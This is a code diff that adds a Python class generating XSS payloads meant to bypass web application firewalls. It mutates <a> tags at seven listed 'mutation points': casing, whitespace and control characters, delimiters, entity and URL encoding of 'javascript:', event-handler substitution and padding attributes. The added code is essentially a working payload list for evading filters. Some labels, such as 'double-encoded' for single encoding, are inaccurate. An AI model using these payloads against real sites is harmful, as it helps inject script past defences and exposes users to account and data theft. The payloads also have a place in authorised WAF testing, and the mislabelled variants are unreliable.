@@ -608,4 +608,185 @@ class SemanticBypassEngine:
         )
 
 
+class AnchorTagMutationEngine:
+    """
+    WAF Bypass via <a> tag mutation points.
+
+    WAFs pattern-match specific constructs like <a href="javascript:...">
+    by scanning for fixed strings. Mutating the tag at precise "mutation points"
+    breaks pattern recognition while keeping the payload semantically equivalent
+    for browsers that normalise HTML before evaluation.
+
+    Mutation points:
+      MP1 - Tag name casing: <a> vs <A> vs <A\t>
+      MP2 - Attribute name casing/spacing: href vs HREF vs hr\tef vs hr\nef
+      MP3 - Value delimiter: "..." vs '...' vs unquoted
+      MP4 - Protocol casing/encoding: javascript: vs JaVaScRiPt: vs &#106;avascript:
+      MP5 - Whitespace/newlines inside protocol: java\tscript: java\nscript:
+      MP6 - Event handler substitution: onclick= onmouseover= onfocus= etc.
+      MP7 - Extra benign attributes injected before/after href
+    """
+
+    # Base XSS payload for href context
+    BASE_HREF_PAYLOAD = "javascript:alert(1)"
+    BASE_EVENT_PAYLOAD = "alert(1)"
+
+    def generate_all(self) -> List[Dict[str, str]]:
+        """
+        Return all anchor-tag mutation payloads.
+
+        Each entry is a dict with:
+          'payload'       - the full mutated <a> tag string
+          'mutation_point' - which MP was exercised
+          'description'   - human-readable description
+        """
+        results: List[Dict[str, str]] = []
+        results.extend(self._mp1_tag_name())
+        results.extend(self._mp2_attr_name())
+        results.extend(self._mp3_value_delimiter())
+        results.extend(self._mp4_protocol_encoding())
+        results.extend(self._mp5_protocol_whitespace())
+        results.extend(self._mp6_event_handlers())
+        results.extend(self._mp7_extra_attributes())
+        return results
+
+    # ------------------------------------------------------------------
+    # MP1 – Tag name casing / extra whitespace before attribute
+    # ------------------------------------------------------------------
+    def _mp1_tag_name(self) -> List[Dict[str, str]]:
+        variants = [
+            ('<a href="javascript:alert(1)">x</a>', 'lowercase tag'),
+            ('<A href="javascript:alert(1)">x</A>', 'uppercase tag'),
+            ('<A HREF="javascript:alert(1)">x</A>', 'all-uppercase tag+attr'),
+            ('<a  href="javascript:alert(1)">x</a>', 'extra space in tag'),
+            ('<a\thref="javascript:alert(1)">x</a>', 'tab between tag and attr'),
+            ('<a\nhref="javascript:alert(1)">x</a>', 'newline between tag and attr'),
+            ('<a\r\nhref="javascript:alert(1)">x</a>', 'CRLF between tag and attr'),
+        ]
+        return [
+            {'payload': p, 'mutation_point': 'MP1', 'description': f'Tag name/spacing: {d}'}
+            for p, d in variants
+        ]
+
+    # ------------------------------------------------------------------
+    # MP2 – Attribute name casing and embedded whitespace
+    # ------------------------------------------------------------------
+    def _mp2_attr_name(self) -> List[Dict[str, str]]:
+        variants = [
+            ('<a HREF="javascript:alert(1)">x</a>', 'HREF uppercase'),
+            ('<a HrEf="javascript:alert(1)">x</a>', 'HrEf mixed case'),
+            ('<a hr\tef="javascript:alert(1)">x</a>', 'tab inside attr name'),
+            ('<a hr\nef="javascript:alert(1)">x</a>', 'newline inside attr name'),
+            ('<a href ="javascript:alert(1)">x</a>', 'space before ='),
+            ('<a href= "javascript:alert(1)">x</a>', 'space after ='),
+            ('<a href = "javascript:alert(1)">x</a>', 'spaces around ='),
+        ]
+        return [
+            {'payload': p, 'mutation_point': 'MP2', 'description': f'Attr name: {d}'}
+            for p, d in variants
+        ]
+
+    # ------------------------------------------------------------------
+    # MP3 – Value delimiter variations
+    # ------------------------------------------------------------------
+    def _mp3_value_delimiter(self) -> List[Dict[str, str]]:
+        variants = [
+            ("<a href='javascript:alert(1)'>x</a>", "single-quoted value"),
+            ("<a href=javascript:alert(1)>x</a>", "unquoted value"),
+            ('<a href=`javascript:alert(1)`>x</a>', "backtick delimiter (IE/Edge)"),
+        ]
+        return [
+            {'payload': p, 'mutation_point': 'MP3', 'description': f'Value delimiter: {d}'}
+            for p, d in variants
+        ]
+
+    # ------------------------------------------------------------------
+    # MP4 – Protocol encoding / casing
+    # ------------------------------------------------------------------
+    def _mp4_protocol_encoding(self) -> List[Dict[str, str]]:
+        variants = [
+            # Case variations
+            ('<a href="JAVASCRIPT:alert(1)">x</a>', 'JAVASCRIPT uppercase'),
+            ('<a href="Javascript:alert(1)">x</a>', 'Javascript capitalised'),
+            ('<a href="JaVaScRiPt:alert(1)">x</a>', 'JaVaScRiPt mixed case'),
+            # HTML entity encoding of first character
+            ('<a href="&#106;avascript:alert(1)">x</a>', 'j as &#106;'),
+            ('<a href="&#x6A;avascript:alert(1)">x</a>', 'j as &#x6A;'),
+            # URL encoding inside href value
+            ('<a href="%6Aavascript:alert(1)">x</a>', 'j as %6A'),
+            ('<a href="java%73cript:alert(1)">x</a>', 's as %73'),
+            ('<a href="j%61vascript:alert(1)">x</a>', 'a as %61'),
+            # Double URL-encoded
+            ('<a href="%6a%61vascript:alert(1)">x</a>', 'ja double-encoded'),
+            # Unicode full-width
+            ('<a href="\uff4aavascript:alert(1)">x</a>', 'j as fullwidth \uff4a'),
+            # Null byte before protocol (some parsers strip it)
+            ('<a href="\x00javascript:alert(1)">x</a>', 'null byte prefix'),
+        ]
+        return [
+            {'payload': p, 'mutation_point': 'MP4', 'description': f'Protocol encoding: {d}'}
+            for p, d in variants
+        ]
+
+    # ------------------------------------------------------------------
+    # MP5 – Whitespace / control chars INSIDE the protocol word
+    # ------------------------------------------------------------------
+    def _mp5_protocol_whitespace(self) -> List[Dict[str, str]]:
+        variants = [
+            ('<a href="java\tscript:alert(1)">x</a>', 'tab inside protocol'),
+            ('<a href="java\nscript:alert(1)">x</a>', 'newline inside protocol'),
+            ('<a href="java\rscript:alert(1)">x</a>', 'CR inside protocol'),
+            ('<a href="java\r\nscript:alert(1)">x</a>', 'CRLF inside protocol'),
+            ('<a href="java&#9;script:alert(1)">x</a>', '&#9; (tab entity) inside protocol'),
+            ('<a href="java&#10;script:alert(1)">x</a>', '&#10; (LF entity) inside protocol'),
+            ('<a href="java&#13;script:alert(1)">x</a>', '&#13; (CR entity) inside protocol'),
+        ]
+        return [
+            {'payload': p, 'mutation_point': 'MP5', 'description': f'Protocol whitespace: {d}'}
+            for p, d in variants
+        ]
+
+    # ------------------------------------------------------------------
+    # MP6 – Event handler substitution (no href needed)
+    # ------------------------------------------------------------------
+    def _mp6_event_handlers(self) -> List[Dict[str, str]]:
+        handlers = [
+            'onclick', 'ondblclick', 'onmousedown', 'onmouseup',
+            'onmouseover', 'onmouseout', 'onmousemove',
+            'onfocus', 'onblur', 'onkeydown', 'onkeyup', 'onkeypress',
+        ]
+        results = []
+        for h in handlers:
+            results.append({
+                'payload': f'<a {h}="alert(1)">x</a>',
+                'mutation_point': 'MP6',
+                'description': f'Event handler: {h}'
+            })
+            # Uppercase handler name
+            results.append({
+                'payload': f'<a {h.upper()}="alert(1)">x</a>',
+                'mutation_point': 'MP6',
+                'description': f'Event handler uppercase: {h.upper()}'
+            })
+        return results
+
+    # ------------------------------------------------------------------
+    # MP7 – Extra benign attributes injected before/after href
+    # ------------------------------------------------------------------
+    def _mp7_extra_attributes(self) -> List[Dict[str, str]]:
+        variants = [
+            ('<a id="x" href="javascript:alert(1)">x</a>', 'id before href'),
+            ('<a href="javascript:alert(1)" id="x">x</a>', 'id after href'),
+            ('<a class="link" href="javascript:alert(1)">x</a>', 'class before href'),
+            ('<a style="color:red" href="javascript:alert(1)">x</a>', 'style before href'),
+            ('<a data-x="1" href="javascript:alert(1)">x</a>', 'data-attr before href'),
+            ('<a href="javascript:alert(1)" target="_blank">x</a>', 'target after href'),
+            ('<a\nhref="javascript:alert(1)"\ntarget="_blank">x</a>', 'newline-separated attrs'),
+        ]
+        return [
+            {'payload': p, 'mutation_point': 'MP7', 'description': f'Extra attributes: {d}'}
+            for p, d in variants
+        ]
+
+
 print("✅ Semantic Bypass Engine loaded successfully")
